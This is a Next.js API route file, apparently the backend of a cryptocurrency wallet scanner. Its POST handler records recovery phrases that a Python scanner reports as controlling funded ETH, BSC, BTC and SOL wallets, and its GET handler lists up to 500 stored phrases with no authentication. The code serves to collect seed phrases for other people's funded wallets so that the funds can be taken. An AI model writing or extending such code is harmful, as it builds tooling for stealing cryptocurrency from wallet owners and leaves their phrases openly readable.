import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';

// POST /api/wallets - called by the Python scanner when a wallet with balance is found
export async function POST(req: NextRequest) {
  try {
    // Validate API key from the Python script
    const apiKey = req.headers.get('x-api-key');
    if (apiKey !== process.env.SCANNER_API_KEY) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body = await req.json();
    const {
      phrase,
      eth_address, eth_balance,
      bsc_address, bsc_balance,
      btc_address, btc_balance,
      sol_address, sol_balance
    } = body;

    if (!phrase) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    const insertData: Record<string, unknown> = {
      phrase,
      eth_address: eth_address || null,
      eth_balance: eth_balance || 0,
      sol_address: sol_address || null,
      sol_balance: sol_balance || 0,
    };

    if (bsc_address !== undefined) insertData.bsc_address = bsc_address;
    if (bsc_balance !== undefined) insertData.bsc_balance = bsc_balance;
    if (btc_address !== undefined) insertData.btc_address = btc_address;
    if (btc_balance !== undefined) insertData.btc_balance = btc_balance;

    const { data, error } = await supabaseAdmin
      .from('wallet_results')
      .insert([insertData])
      .select()
      .single();

    if (error) throw error;

    return NextResponse.json({ success: true, data });
  } catch (err) {
    console.error('POST /api/wallets error:', err);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

// GET /api/wallets - fetch all found wallets
export async function GET() {
  try {
    const { data, error } = await supabaseAdmin
      .from('wallet_results')
      .select('*')
      .order('found_at', { ascending: false })
      .limit(500);

    if (error) throw error;

    return NextResponse.json({ data });
  } catch (err) {
    console.error('GET /api/wallets error:', err);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
